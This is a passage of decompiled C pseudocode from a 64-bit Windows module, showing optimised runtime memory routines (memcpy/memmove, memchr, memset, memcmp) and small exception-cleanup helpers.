    "                v65 = _mm_loadu_si128(_RDX + 6);",
    "                v66 = _mm_loadu_si128(_RDX + 7);",
    "                _RCX[4] = _mm_loadu_si128(_RDX + 4);",
    "                _RCX[5] = v64;",
    "                _RCX[6] = v65;",
    "                _RCX[7] = v66;",
    "                _RCX += 8;",
    "                _RDX += 8;",
    "                _R8 -= 128LL;",
    "              }",
    "              while ( _R8 >= 0x80 );",
    "            }",
    "          }",
    "          v67 = (_R8 + 15) & 0xFFFFFFFFFFFFFFF0uLL;",
    "          switch ( v67 >> 4 )",
    "          {",
    "            case 0uLL:",
    "              goto LABEL_65;",
    "            case 1uLL:",
    "              goto LABEL_64;",
    "            case 2uLL:",
    "              goto LABEL_63;",
    "            case 3uLL:",
    "              goto LABEL_62;",
    "            case 4uLL:",
    "              goto LABEL_61;",
    "            case 5uLL:",
    "              goto LABEL_60;",
    "            case 6uLL:",
    "              goto LABEL_59;",
    "            case 7uLL:",
    "              goto LABEL_58;",
    "            case 8uLL:",
    "              *(__m128i *)((char *)&_RCX[-8] + v67) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v67 - 128));",
    "LABEL_58:",
    "              *(__m128i *)((char *)&_RCX[-7] + v67) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v67 - 112));",
    "LABEL_59:",
    "              *(__m128i *)((char *)&_RCX[-6] + v67) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v67 - 96));",
    "LABEL_60:",
    "              *(__m128i *)((char *)&_RCX[-5] + v67) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v67 - 80));",
    "LABEL_61:",
    "              *(__m128i *)((char *)&_RCX[-4] + v67) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v67 - 64));",
    "LABEL_62:",
    "              *(__m128i *)((char *)&_RCX[-3] + v67) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v67 - 48));",
    "LABEL_63:",
    "              *(__m128i *)((char *)&_RCX[-2] + v67) = _mm_loadu_si128((const __m128i *)((char *)_RDX + v67 - 32));",
    "LABEL_64:",
    "              *(__m128i *)((char *)&_RCX[-1] + _R8) = v59;",
    "LABEL_65:",
    "              *_RAX = v58;",
    "              break;",
    "          }",
    "          return;",
    "        }",
    "LABEL_78:",
    "        sub_180036150(_RCX, _RDX, _R8);",
    "        return;",
    "      }",
    "      if ( _R8 > 0x2000 && _R8 <= 0x180000 && (dword_18004CBCC & 2) != 0 )",
    "        goto LABEL_78;",
    "      __asm",
    "      {",
    "        vmovdqu ymm0, ymmword ptr [rdx]",
    "        vmovdqu ymm5, ymmword ptr [rdx+r8-20h]",
    "      }",
    "      if ( _R8 <= 0x100",
    "        || (v25 = ((unsigned __int8)_RCX & 0x1F) - 32LL,",
    "            _RCX = (__m128i *)((char *)_RCX - v25),",
    "            _RDX = (const __m128i *)((char *)_RDX - v25),",
    "            _R8 += v25,",
    "            _R8 <= 0x100) )",
    "      {",
    "LABEL_30:",
    "        _R9 = (_R8 + 31) & 0xFFFFFFFFFFFFFFE0uLL;",
    "        switch ( _R9 >> 5 )",
    "        {",
    "          case 0uLL:",
    "            goto LABEL_39;",
    "          case 1uLL:",
    "            goto LABEL_38;",
    "          case 2uLL:",
    "            goto LABEL_37;",
    "          case 3uLL:",
    "            goto LABEL_36;",
    "          case 4uLL:",
    "            goto LABEL_35;",
    "          case 5uLL:",
    "            goto LABEL_34;",
    "          case 6uLL:",
    "            goto LABEL_33;",
    "          case 7uLL:",
    "            goto LABEL_32;",
    "          case 8uLL:",
    "            __asm",
    "            {",
    "              vmovdqu ymm1, ymmword ptr [rdx+r9-100h]; jumptable 00000001800363D2 case 8",
    "              vmovdqu ymmword ptr [rcx+r9-100h], ymm1",
    "            }",
    "LABEL_32:",
    "            __asm",
    "            {",
    "              vmovdqu ymm1, ymmword ptr [rdx+r9-0E0h]; jumptable 00000001800363D2 case 7",
    "              vmovdqu ymmword ptr [rcx+r9-0E0h], ymm1",
    "            }",
    "LABEL_33:",
    "            __asm",
    "            {",
    "              vmovdqu ymm1, ymmword ptr [rdx+r9-0C0h]; jumptable 00000001800363D2 case 6",
    "              vmovdqu ymmword ptr [rcx+r9-0C0h], ymm1",
    "            }",
    "LABEL_34:",
    "            __asm",
    "            {",
    "              vmovdqu ymm1, ymmword ptr [rdx+r9-0A0h]; jumptable 00000001800363D2 case 5",
    "              vmovdqu ymmword ptr [rcx+r9-0A0h], ymm1",
    "            }",
    "LABEL_35:",
    "            __asm",
    "            {",
    "              vmovdqu ymm1, ymmword ptr [rdx+r9-80h]; jumptable 00000001800363D2 case 4",
    "              vmovdqu ymmword ptr [rcx+r9-80h], ymm1",
    "            }",
    "LABEL_36:",
    "            __asm",
    "            {",
    "              vmovdqu ymm1, ymmword ptr [rdx+r9-60h]; jumptable 00000001800363D2 case 3",
    "              vmovdqu ymmword ptr [rcx+r9-60h], ymm1",
    "            }",
    "LABEL_37:",
    "            __asm",
    "            {",
    "              vmovdqu ymm1, ymmword ptr [rdx+r9-40h]; jumptable 00000001800363D2 case 2",
    "              vmovdqu ymmword ptr [rcx+r9-40h], ymm1",
    "            }",
    "LABEL_38:",
    "            __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm5; jumptable 00000001800363D2 case 1 }",
    "LABEL_39:",
    "            __asm",
    "            {",
    "              vmovdqu ymmword ptr [rax], ymm0; jumptable 00000001800363D2 case 0",
    "              vzeroupper",
    "            }",
    "            break;",
    "        }",
    "        return;",
    "      }",
    "      if ( _R8 <= 0x180000 )",
    "      {",
    "        do",
    "        {",
    "          __asm",
    "          {",
    "            vmovdqu ymm1, ymmword ptr [rdx]",
    "            vmovdqu ymm2, ymmword ptr [rdx+20h]",
    "            vmovdqu ymm3, ymmword ptr [rdx+40h]",
    "            vmovdqu ymm4, ymmword ptr [rdx+60h]",
    "            vmovdqa ymmword ptr [rcx], ymm1",
    "            vmovdqa ymmword ptr [rcx+20h], ymm2",
    "            vmovdqa ymmword ptr [rcx+40h], ymm3",
    "            vmovdqa ymmword ptr [rcx+60h], ymm4",
    "            vmovdqu ymm1, ymmword ptr [rdx+80h]",
    "            vmovdqu ymm2, ymmword ptr [rdx+0A0h]",
    "            vmovdqu ymm3, ymmword ptr [rdx+0C0h]",
    "            vmovdqu ymm4, ymmword ptr [rdx+0E0h]",
    "            vmovdqa ymmword ptr [rcx+80h], ymm1",
    "            vmovdqa ymmword ptr [rcx+0A0h], ymm2",
    "            vmovdqa ymmword ptr [rcx+0C0h], ymm3",
    "            vmovdqa ymmword ptr [rcx+0E0h], ymm4",
    "          }",
    "          _RCX += 16;",
    "          _RDX += 16;",
    "          _R8 -= 256LL;",
    "        }",
    "        while ( _R8 >= 0x100 );",
    "        goto LABEL_30;",
    "      }",
    "      do",
    "      {",
    "        __asm",
    "        {",
    "          vmovdqu ymm1, ymmword ptr [rdx]",
    "          vmovdqu ymm2, ymmword ptr [rdx+20h]",
    "          vmovdqu ymm3, ymmword ptr [rdx+40h]",
    "          vmovdqu ymm4, ymmword ptr [rdx+60h]",
    "          vmovntdq ymmword ptr [rcx], ymm1",
    "          vmovntdq ymmword ptr [rcx+20h], ymm2",
    "          vmovntdq ymmword ptr [rcx+40h], ymm3",
    "          vmovntdq ymmword ptr [rcx+60h], ymm4",
    "          vmovdqu ymm1, ymmword ptr [rdx+80h]",
    "          vmovdqu ymm2, ymmword ptr [rdx+0A0h]",
    "          vmovdqu ymm3, ymmword ptr [rdx+0C0h]",
    "          vmovdqu ymm4, ymmword ptr [rdx+0E0h]",
    "          vmovntdq ymmword ptr [rcx+80h], ymm1",
    "          vmovntdq ymmword ptr [rcx+0A0h], ymm2",
    "          vmovntdq ymmword ptr [rcx+0C0h], ymm3",
    "          vmovntdq ymmword ptr [rcx+0E0h], ymm4",
    "        }",
    "        _RCX += 16;",
    "        _RDX += 16;",
    "        _R8 -= 256LL;",
    "      }",
    "      while ( _R8 >= 0x100 );",
    "      _R9 = (_R8 + 31) & 0xFFFFFFFFFFFFFFE0uLL;",
    "      switch ( _R9 >> 5 )",
    "      {",
    "        case 0uLL:",
    "          goto LABEL_50;",
    "        case 1uLL:",
    "          goto LABEL_49;",
    "        case 2uLL:",
    "          goto LABEL_48;",
    "        case 3uLL:",
    "          goto LABEL_47;",
    "        case 4uLL:",
    "          goto LABEL_46;",
    "        case 5uLL:",
    "          goto LABEL_45;",
    "        case 6uLL:",
    "          goto LABEL_44;",
    "        case 7uLL:",
    "          goto LABEL_43;",
    "        case 8uLL:",
    "          __asm",
    "          {",
    "            vmovdqu ymm1, ymmword ptr [rdx+r9-100h]; jumptable 0000000180036502 case 8",
    "            vmovntdq ymmword ptr [rcx+r9-100h], ymm1",
    "          }",
    "LABEL_43:",
    "          __asm",
    "          {",
    "            vmovdqu ymm1, ymmword ptr [rdx+r9-0E0h]; jumptable 0000000180036502 case 7",
    "            vmovntdq ymmword ptr [rcx+r9-0E0h], ymm1",
    "          }",
    "LABEL_44:",
    "          __asm",
    "          {",
    "            vmovdqu ymm1, ymmword ptr [rdx+r9-0C0h]; jumptable 0000000180036502 case 6",
    "            vmovntdq ymmword ptr [rcx+r9-0C0h], ymm1",
    "          }",
    "LABEL_45:",
    "          __asm",
    "          {",
    "            vmovdqu ymm1, ymmword ptr [rdx+r9-0A0h]; jumptable 0000000180036502 case 5",
    "            vmovntdq ymmword ptr [rcx+r9-0A0h], ymm1",
    "          }",
    "LABEL_46:",
    "          __asm",
    "          {",
    "            vmovdqu ymm1, ymmword ptr [rdx+r9-80h]; jumptable 0000000180036502 case 4",
    "            vmovntdq ymmword ptr [rcx+r9-80h], ymm1",
    "          }",
    "LABEL_47:",
    "          __asm",
    "          {",
    "            vmovdqu ymm1, ymmword ptr [rdx+r9-60h]; jumptable 0000000180036502 case 3",
    "            vmovntdq ymmword ptr [rcx+r9-60h], ymm1",
    "          }",
    "LABEL_48:",
    "          __asm",
    "          {",
    "            vmovdqu ymm1, ymmword ptr [rdx+r9-40h]; jumptable 0000000180036502 case 2",
    "            vmovntdq ymmword ptr [rcx+r9-40h], ymm1",
    "          }",
    "LABEL_49:",
    "          __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm5; jumptable 0000000180036502 case 1 }",
    "LABEL_50:",
    "          __asm { vmovdqu ymmword ptr [rax], ymm0; jumptable 0000000180036502 case 0 }",
    "          _mm_sfence();",
    "          __asm { vzeroupper }",
    "          break;",
    "      }",
    "      return;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800367E0(const __m128i *a1, unsigned __int8 a2, unsigned __int64 a3)",
    "{",
    "  unsigned int v3; // edx",
    "  __m128i v4; // xmm0",
    "  __int64 result; // rax",
    "  bool v6; // zf",
    "  __m128i si128; // xmm1",
    "",
    "  v3 = 16843009 * a2;",
    "  v4 = _mm_shuffle_epi32(_mm_cvtsi32_si128(v3), 0);",
    "  result = 0;",
    "  if ( a3 >= 0x20 )",
    "  {",
    "    if ( ((unsigned __int8)a1 & 0xF) != 0 )",
    "    {",
    "      result = ((unsigned __int8)a1 & 0xF) - 16LL;",
    "      a3 += result;",
    "      a1 = (const __m128i *)((char *)a1 - result);",
    "      while ( (_BYTE)v3 != a1->m128i_i8[result] )",
    "      {",
    "        if ( !++result )",
    "        {",
    "          if ( a3 >= 0x20 )",
    "            goto LABEL_7;",
    "          goto LABEL_10;",
    "        }",
    "      }",
    "    }",
    "    else",
    "    {",
    "LABEL_7:",
    "      while ( 1 )",
    "      {",
    "        v6 = !_BitScanForward64(",
    "                (unsigned __int64 *)&result,",
    "                (unsigned int)_mm_movemask_epi8(_mm_cmpeq_epi8(_mm_load_si128(a1), v4)));",
    "        if ( !v6 )",
    "          break;",
    "        si128 = _mm_load_si128(++a1);",
    "        v6 = !_BitScanForward64((unsigned __int64 *)&result, (unsigned int)_mm_movemask_epi8(_mm_cmpeq_epi8(si128, v4)));",
    "        if ( !v6 )",
    "          break;",
    "        ++a1;",
    "        a3 -= 32LL;",
    "        if ( a3 < 0x20 )",
    "          goto LABEL_10;",
    "      }",
    "    }",
    "    goto LABEL_14;",
    "  }",
    "LABEL_10:",
    "  if ( a3 )",
    "  {",
    "    while ( (_BYTE)v3 != a1->m128i_i8[0] )",
    "    {",
    "      a1 = (const __m128i *)((char *)a1 + 1);",
    "      if ( !--a3 )",
    "        return result;",
    "    }",
    "LABEL_14:",
    "    result += (__int64)a1;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180036890(void *a1, char a2, unsigned __int64 a3, __int64 a4)",
    "{",
    "  memset(a1, a2, a3);",
    "  return a4;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_1800368A0(__int64 a1, unsigned __int8 a2, unsigned __int64 a3)",
    "{",
    "  _OWORD *result; // rax",
    "  __int64 v6; // r11",
    "  unsigned __int64 v8; // rcx",
    "  __m128i v9; // xmm0",
    "  __int64 v11; // r9",
    "  __int64 v16; // r9",
    "  __m128i *v17; // rcx",
    "  unsigned __int64 v18; // r8",
    "  unsigned __int64 v19; // r9",
    "",
    "  result = (_OWORD *)a1;",
    "  v6 = 0x101010101010101LL * a2;",
    "  v8 = a3 + a1;",
    "  switch ( a3 )",
    "  {",
    "    case 0uLL:",
    "      return result;",
    "    case 1uLL:",
    "      goto LABEL_5;",
    "    case 2uLL:",
    "      goto LABEL_8;",
    "    case 3uLL:",
    "      goto LABEL_4;",
    "    case 4uLL:",
    "      goto LABEL_12;",
    "    case 5uLL:",
    "      goto LABEL_10;",
    "    case 6uLL:",
    "      goto LABEL_7;",
    "    case 7uLL:",
    "      goto LABEL_3;",
    "    case 8uLL:",
    "      *(_QWORD *)(v8 - 8) = v6;",
    "      return result;",
    "    case 9uLL:",
    "      *(_QWORD *)(v8 - 9) = v6;",
    "      *(_BYTE *)(v8 - 1) = a2;",
    "      return result;",
    "    case 0xAuLL:",
    "      *(_QWORD *)(v8 - 10) = v6;",
    "      *(_WORD *)(v8 - 2) = v6;",
    "      return result;",
    "    case 0xBuLL:",
    "      *(_QWORD *)(v8 - 11) = v6;",
    "      *(_WORD *)(v8 - 3) = v6;",
    "      *(_BYTE *)(v8 - 1) = a2;",
    "      return result;",
    "    case 0xCuLL:",
    "      *(_QWORD *)(v8 - 12) = v6;",
    "LABEL_12:",
    "      *(_DWORD *)(v8 - 4) = v6;",
    "      return result;",
    "    case 0xDuLL:",
    "      *(_QWORD *)(v8 - 13) = v6;",
    "LABEL_10:",
    "      *(_DWORD *)(v8 - 5) = v6;",
    "      *(_BYTE *)(v8 - 1) = a2;",
    "      return result;",
    "    case 0xEuLL:",
    "      *(_QWORD *)(v8 - 14) = v6;",
    "LABEL_7:",
    "      *(_DWORD *)(v8 - 6) = v6;",
    "LABEL_8:",
    "      *(_WORD *)(v8 - 2) = v6;",
    "      return result;",
    "    case 0xFuLL:",
    "      *(_QWORD *)(v8 - 15) = v6;",
    "LABEL_3:",
    "      *(_DWORD *)(v8 - 7) = v6;",
    "LABEL_4:",
    "      *(_WORD *)(v8 - 3) = v6;",
    "LABEL_5:",
    "      *(_BYTE *)(v8 - 1) = a2;",
    "      return result;",
    "    default:",
    "      v9 = _mm_unpacklo_epi64((__m128i)(unsigned __int64)v6, (__m128i)(unsigned __int64)v6);",
    "      if ( a3 <= 0x20 )",
    "      {",
    "        *(__m128i *)a1 = v9;",
    "        *(__m128i *)(a1 + a3 - 16) = v9;",
    "        return result;",
    "      }",
    "      if ( (unsigned int)dword_18004B0D0 < 3 )",
    "      {",
    "        if ( a3 <= qword_18004B0D8 || (dword_18004CBCC & 2) == 0 )",
    "        {",
    "          v16 = (a1 & 0xF) - 16;",
    "          v17 = (__m128i *)(a1 - v16);",
    "          v18 = v16 + a3;",
    "          if ( v18 > 0x80 )",
    "          {",
    "            do",
    "            {",
    "              *v17 = v9;",
    "              v17[1] = v9;",
    "              v17[2] = v9;",
    "              v17[3] = v9;",
    "              v17[4] = v9;",
    "              v17[5] = v9;",
    "              v17[6] = v9;",
    "              v17[7] = v9;",
    "              v17 += 8;",
    "              v18 -= 128LL;",
    "            }",
    "            while ( v18 >= 0x80 );",
    "          }",
    "          v19 = (v18 + 15) & 0xFFFFFFFFFFFFFFF0uLL;",
    "          switch ( v19 >> 4 )",
    "          {",
    "            case 0uLL:",
    "              goto LABEL_60;",
    "            case 1uLL:",
    "              goto LABEL_59;",
    "            case 2uLL:",
    "              goto LABEL_58;",
    "            case 3uLL:",
    "              goto LABEL_57;",
    "            case 4uLL:",
    "              goto LABEL_56;",
    "            case 5uLL:",
    "              goto LABEL_55;",
    "            case 6uLL:",
    "              goto LABEL_54;",
    "            case 7uLL:",
    "              goto LABEL_53;",
    "            case 8uLL:",
    "              *(__m128i *)((char *)&v17[-8] + v19) = v9;",
    "LABEL_53:",
    "              *(__m128i *)((char *)&v17[-7] + v19) = v9;",
    "LABEL_54:",
    "              *(__m128i *)((char *)&v17[-6] + v19) = v9;",
    "LABEL_55:",
    "              *(__m128i *)((char *)&v17[-5] + v19) = v9;",
    "LABEL_56:",
    "              *(__m128i *)((char *)&v17[-4] + v19) = v9;",
    "LABEL_57:",
    "              *(__m128i *)((char *)&v17[-3] + v19) = v9;",
    "LABEL_58:",
    "              *(__m128i *)((char *)&v17[-2] + v19) = v9;",
    "LABEL_59:",
    "              *(__m128i *)((char *)&v17[-1] + v18) = v9;",
    "LABEL_60:",
    "              *result = v9;",
    "              break;",
    "          }",
    "          return result;",
    "        }",
    "        return (_OWORD *)sub_180036890((void *)a1, a2, a3, a1);",
    "      }",
    "      if ( a3 > qword_18004B0D8 && a3 <= qword_18004B0E0 && (dword_18004CBCC & 2) != 0 )",
    "        return (_OWORD *)sub_180036890((void *)a1, a2, a3, a1);",
    "      __asm { vinsertf128 ymm0, ymm0, xmm0, 1 }",
    "      v11 = (a1 & 0x1F) - 32;",
    "      _RCX = a1 - v11;",
    "      _R8 = v11 + a3;",
    "      if ( _R8 <= 0x100 )",
    "        goto LABEL_26;",
    "      if ( _R8 <= qword_18004B0E0 )",
    "      {",
    "        do",
    "        {",
    "          __asm",
    "          {",
    "            vmovdqa ymmword ptr [rcx], ymm0",
    "            vmovdqa ymmword ptr [rcx+20h], ymm0",
    "            vmovdqa ymmword ptr [rcx+40h], ymm0",
    "            vmovdqa ymmword ptr [rcx+60h], ymm0",
    "            vmovdqa ymmword ptr [rcx+80h], ymm0",
    "            vmovdqa ymmword ptr [rcx+0A0h], ymm0",
    "            vmovdqa ymmword ptr [rcx+0C0h], ymm0",
    "            vmovdqa ymmword ptr [rcx+0E0h], ymm0",
    "          }",
    "          _RCX += 256;",
    "          _R8 -= 256LL;",
    "        }",
    "        while ( _R8 >= 0x100 );",
    "LABEL_26:",
    "        _R9 = (_R8 + 31) & 0xFFFFFFFFFFFFFFE0uLL;",
    "        switch ( _R9 >> 5 )",
    "        {",
    "          case 0uLL:",
    "            goto LABEL_35;",
    "          case 1uLL:",
    "            goto LABEL_34;",
    "          case 2uLL:",
    "            goto LABEL_33;",
    "          case 3uLL:",
    "            goto LABEL_32;",
    "          case 4uLL:",
    "            goto LABEL_31;",
    "          case 5uLL:",
    "            goto LABEL_30;",
    "          case 6uLL:",
    "            goto LABEL_29;",
    "          case 7uLL:",
    "            goto LABEL_28;",
    "          case 8uLL:",
    "            __asm { vmovdqu ymmword ptr [rcx+r9-100h], ymm0; jumptable 0000000180036A34 case 8 }",
    "LABEL_28:",
    "            __asm { vmovdqu ymmword ptr [rcx+r9-0E0h], ymm0; jumptable 0000000180036A34 case 7 }",
    "LABEL_29:",
    "            __asm { vmovdqu ymmword ptr [rcx+r9-0C0h], ymm0; jumptable 0000000180036A34 case 6 }",
    "LABEL_30:",
    "            __asm { vmovdqu ymmword ptr [rcx+r9-0A0h], ymm0; jumptable 0000000180036A34 case 5 }",
    "LABEL_31:",
    "            __asm { vmovdqu ymmword ptr [rcx+r9-80h], ymm0; jumptable 0000000180036A34 case 4 }",
    "LABEL_32:",
    "            __asm { vmovdqu ymmword ptr [rcx+r9-60h], ymm0; jumptable 0000000180036A34 case 3 }",
    "LABEL_33:",
    "            __asm { vmovdqu ymmword ptr [rcx+r9-40h], ymm0; jumptable 0000000180036A34 case 2 }",
    "LABEL_34:",
    "            __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm0; jumptable 0000000180036A34 case 1 }",
    "LABEL_35:",
    "            __asm",
    "            {",
    "              vmovdqu ymmword ptr [rax], ymm0; jumptable 0000000180036A34 case 0",
    "              vzeroupper",
    "            }",
    "            break;",
    "        }",
    "        return result;",
    "      }",
    "      do",
    "      {",
    "        __asm",
    "        {",
    "          vmovntdq ymmword ptr [rcx], ymm0",
    "          vmovntdq ymmword ptr [rcx+20h], ymm0",
    "          vmovntdq ymmword ptr [rcx+40h], ymm0",
    "          vmovntdq ymmword ptr [rcx+60h], ymm0",
    "          vmovntdq ymmword ptr [rcx+80h], ymm0",
    "          vmovntdq ymmword ptr [rcx+0A0h], ymm0",
    "          vmovntdq ymmword ptr [rcx+0C0h], ymm0",
    "          vmovntdq ymmword ptr [rcx+0E0h], ymm0",
    "        }",
    "        _RCX += 256;",
    "        _R8 -= 256LL;",
    "      }",
    "      while ( _R8 >= 0x100 );",
    "      _R9 = (_R8 + 31) & 0xFFFFFFFFFFFFFFE0uLL;",
    "      switch ( _R9 >> 5 )",
    "      {",
    "        case 0uLL:",
    "          goto LABEL_46;",
    "        case 1uLL:",
    "          goto LABEL_45;",
    "        case 2uLL:",
    "          goto LABEL_44;",
    "        case 3uLL:",
    "          goto LABEL_43;",
    "        case 4uLL:",
    "          goto LABEL_42;",
    "        case 5uLL:",
    "          goto LABEL_41;",
    "        case 6uLL:",
    "          goto LABEL_40;",
    "        case 7uLL:",
    "          goto LABEL_39;",
    "        case 8uLL:",
    "          __asm { vmovntdq ymmword ptr [rcx+r9-100h], ymm0; jumptable 0000000180036AF4 case 8 }",
    "LABEL_39:",
    "          __asm { vmovntdq ymmword ptr [rcx+r9-0E0h], ymm0; jumptable 0000000180036AF4 case 7 }",
    "LABEL_40:",
    "          __asm { vmovntdq ymmword ptr [rcx+r9-0C0h], ymm0; jumptable 0000000180036AF4 case 6 }",
    "LABEL_41:",
    "          __asm { vmovntdq ymmword ptr [rcx+r9-0A0h], ymm0; jumptable 0000000180036AF4 case 5 }",
    "LABEL_42:",
    "          __asm { vmovntdq ymmword ptr [rcx+r9-80h], ymm0; jumptable 0000000180036AF4 case 4 }",
    "LABEL_43:",
    "          __asm { vmovntdq ymmword ptr [rcx+r9-60h], ymm0; jumptable 0000000180036AF4 case 3 }",
    "LABEL_44:",
    "          __asm { vmovntdq ymmword ptr [rcx+r9-40h], ymm0; jumptable 0000000180036AF4 case 2 }",
    "LABEL_45:",
    "          __asm { vmovdqu ymmword ptr [rcx+r8-20h], ymm0; jumptable 0000000180036AF4 case 1 }",
    "LABEL_46:",
    "          __asm { vmovdqu ymmword ptr [rax], ymm0; jumptable 0000000180036AF4 case 0 }",
    "          _mm_sfence();",
    "          __asm { vzeroupper }",
    "          break;",
    "      }",
    "      return result;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180036C40(unsigned __int64 *a1, __int64 a2, unsigned __int64 a3)",
    "{",
    "  __int64 v3; // rdx",
    "  bool v4; // cf",
    "  unsigned __int64 v6; // r9",
    "  unsigned __int64 v7; // rax",
    "  unsigned __int64 v8; // r9",
    "",
    "  v3 = a2 - (_QWORD)a1;",
    "  if ( a3 < 8 )",
    "    goto LABEL_6;",
    "  for ( ; ((unsigned __int8)a1 & 7) != 0; --a3 )",
    "  {",
    "    v4 = *(_BYTE *)a1 < *((_BYTE *)a1 + v3);",
    "    if ( *(_BYTE *)a1 != *((_BYTE *)a1 + v3) )",
    "      return -v4 - ((unsigned int)v4 - 1);",
    "    a1 = (unsigned __int64 *)((char *)a1 + 1);",
    "  }",
    "  if ( !(a3 >> 3) )",
    "  {",
    "LABEL_6:",
    "    if ( !a3 )",
    "      return 0;",
    "    while ( 1 )",
    "    {",
    "      v4 = *(_BYTE *)a1 < *((_BYTE *)a1 + v3);",
    "      if ( *(_BYTE *)a1 != *((_BYTE *)a1 + v3) )",
    "        break;",
    "      a1 = (unsigned __int64 *)((char *)a1 + 1);",
    "      if ( !--a3 )",
    "        return 0;",
    "    }",
    "    return -v4 - ((unsigned int)v4 - 1);",
    "  }",
    "  v6 = a3 >> 5;",
    "  if ( a3 >> 5 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v7 = *a1;",
    "      if ( *a1 != *(unsigned __int64 *)((char *)a1 + v3) )",
    "        break;",
    "      v7 = a1[1];",
    "      if ( v7 != *(unsigned __int64 *)((char *)a1 + v3 + 8) )",
    "        goto LABEL_24;",
    "      v7 = a1[2];",
    "      if ( v7 != *(unsigned __int64 *)((char *)a1 + v3 + 16) )",
    "        goto LABEL_23;",
    "      v7 = a1[3];",
    "      if ( v7 != *(unsigned __int64 *)((char *)a1 + v3 + 24) )",
    "      {",
    "        ++a1;",
    "LABEL_23:",
    "        ++a1;",
    "LABEL_24:",
    "        ++a1;",
    "        break;",
    "      }",
    "      a1 += 4;",
    "      if ( !--v6 )",
    "      {",
    "        a3 &= 0x1Fu;",
    "        goto LABEL_18;",
    "      }",
    "    }",
    "  }",
    "  else",
    "  {",
    "LABEL_18:",
    "    v8 = a3 >> 3;",
    "    if ( !(a3 >> 3) )",
    "      goto LABEL_6;",
    "    while ( 1 )",
    "    {",
    "      v7 = *a1;",
    "      if ( *a1 != *(unsigned __int64 *)((char *)a1 + v3) )",
    "        break;",
    "      ++a1;",
    "      if ( !--v8 )",
    "      {",
    "        a3 &= 7u;",
    "        goto LABEL_6;",
    "      }",
    "    }",
    "  }",
    "  v4 = _byteswap_uint64(v7) < _byteswap_uint64(*(unsigned __int64 *)((char *)a1 + v3));",
    "  return -v4 - ((unsigned int)v4 - 1);",
    "}",
    "",
    "",
    "void sub_180036D30()",
    "{",
    "  sub_1800116E0();",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180036E90(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *(_DWORD *)(a2 + 32) & 2;",
    "  if ( (_DWORD)result )",
    "  {",
    "    *(_DWORD *)(a2 + 32) &= ~2u;",
    "    return sub_180006BD0((_QWORD *)(a2 + 232));",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180036EE9(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *(_DWORD *)(a2 + 32) & 0x20;",
    "  if ( (_DWORD)result )",
    "  {",
    "    *(_DWORD *)(a2 + 32) &= ~0x20u;",
    "    return sub_180004160(*(__int64 **)(a2 + 72));",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180036F10(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *(_DWORD *)(a2 + 32) & 1;",
    "  if ( (_DWORD)result )",
    "  {",
    "    *(_DWORD *)(a2 + 32) &= ~1u;",
    "    return sub_180004160(*(__int64 **)(a2 + 40));",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180036F80(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *(_DWORD *)(a2 + 32) & 2;",
    "  if ( (_DWORD)result )",
    "  {",
    "    *(_DWORD *)(a2 + 32) &= ~2u;",
    "    return sub_180006BD0((_QWORD *)(a2 + 280));",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800370DC(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // rdx",
    "  char v3; // cl",
    "  int v4; // ecx",
    "",
    "  v2 = *(_QWORD *)(a2 + 56) + *(int *)(**(_QWORD **)(a2 + 56) + 4LL);",
    "  v3 = 4;",
    "  if ( *(_QWORD *)(v2 + 72) )",
    "    v3 = 0;",
    "  v4 = *(_BYTE *)(v2 + 16) & 0x13 | 4 | v3 & 0x17;",
    "  *(_DWORD *)(v2 + 16) = v4;",
    "  if ( (v4 & *(_DWORD *)(v2 + 20)) != 0 )",
    "    throw;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180037140(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *(_DWORD *)(a2 + 88) & 1;",
    "  if ( (_DWORD)result )",
    "  {",
    "    *(_DWORD *)(a2 + 88) &= ~1u;",
    "    return sub_180006BD0((_QWORD *)(*(_QWORD *)(a2 + 64) + 144LL));",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800371D0(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *(_DWORD *)(a2 + 32) & 1;",
    "  if ( (_DWORD)result )",
    "  {",
    "    *(_DWORD *)(a2 + 32) &= ~1u;",
    "    return sub_180006BD0((_QWORD *)(*(_QWORD *)(a2 + 40) + 176LL));",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18003727C(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // rdx",
    "  char v3; // cl",
    "  int v4; // ecx",
    "",
    "  v2 = *(_QWORD *)(a2 + 40) + *(int *)(**(_QWORD **)(a2 + 40) + 4LL);",
    "  v3 = 4;",
    "  if ( *(_QWORD *)(v2 + 72) )",
    "    v3 = 0;",
    "  v4 = *(_BYTE *)(v2 + 16) & 0x13 | 4 | v3 & 0x17;",
    "  *(_DWORD *)(v2 + 16) = v4;",
    "  if ( (v4 & *(_DWORD *)(v2 + 20)) != 0 )",
    "    throw;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 sub_1800372E0()",
    "{",
    "  return 0;",
    "}",
    "",
    "",
